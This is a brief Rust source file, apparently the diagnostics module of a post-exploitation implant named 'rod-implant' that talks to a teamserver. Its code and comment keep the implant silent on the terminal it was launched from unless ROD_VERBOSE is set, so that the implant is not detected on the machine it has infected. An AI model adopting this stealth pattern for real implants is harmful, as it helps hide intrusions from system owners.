use std::sync::OnceLock;

// Fielded diagnostics: silent by default. A dropped implant prints nothing
// to the terminal it was launched from -- enrollment status, contact
// failures, and refusals all stay between it and the teamserver, because a
// shell that echoes "rod-implant: enrolled ..." is a confession. Setting
// ROD_VERBOSE (any value) opts back in: the operator's own testing and the
// e2e suite run with the terminal story restored. Exit codes still tell the
// bare-bones story when nobody is watching.

fn verbose() -> bool {
    static VERBOSE: OnceLock<bool> = OnceLock::new();
    *VERBOSE.get_or_init(|| {
        std::env::var("ROD_VERBOSE")
            .map(|v| !v.is_empty())
            .unwrap_or(false)
    })
}

/// One diagnostic line, prefixed and stderr-bound, only under ROD_VERBOSE.
#[macro_export]
macro_rules! diag {
    ($($arg:tt)*) => {
        if $crate::diag::enabled() {
            eprintln!("rod-implant: {}", format!($($arg)*));
        }
    };
}

// The macro's gate: named for what it answers at the call site.
pub fn enabled() -> bool {
    verbose()
}
